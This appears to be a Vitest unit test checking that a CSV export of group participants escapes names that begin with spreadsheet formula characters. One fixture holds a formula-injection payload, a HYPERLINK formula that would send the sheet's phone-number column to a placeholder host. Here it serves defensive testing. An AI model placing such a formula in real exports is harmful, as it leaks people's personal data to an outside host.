import { describe, expect, it } from "vitest";

import { csvDeParticipantes } from "./painel";

describe("CSV de participantes", () => {
  it("nome que começa com fórmula vira texto na planilha", () => {
    const csv = csvDeParticipantes(
      [
        { telefone: "5511988887777", nome: '=HYPERLINK("https://x.tld/?d="&A2:A500,"Ver")', admin: false, dono: false },
        { telefone: "5511988887778", nome: "+1", admin: false, dono: false },
        { telefone: "5511988887779", nome: "@x", admin: true, dono: false },
        { telefone: "5511988887770", nome: "Maria, da loja", admin: false, dono: false },
      ] as never,
      () => "membro",
    );
    const linhas = csv.split("\n");
    expect(linhas[1]).toContain(`"'=HYPERLINK(""https://x.tld/?d=""&A2:A500,""Ver"")"`);
    expect(linhas[2]).toContain(",'+1,");
    expect(linhas[3]).toContain(",'@x,");
    expect(linhas[4]).toContain('"Maria, da loja"');
  });
});
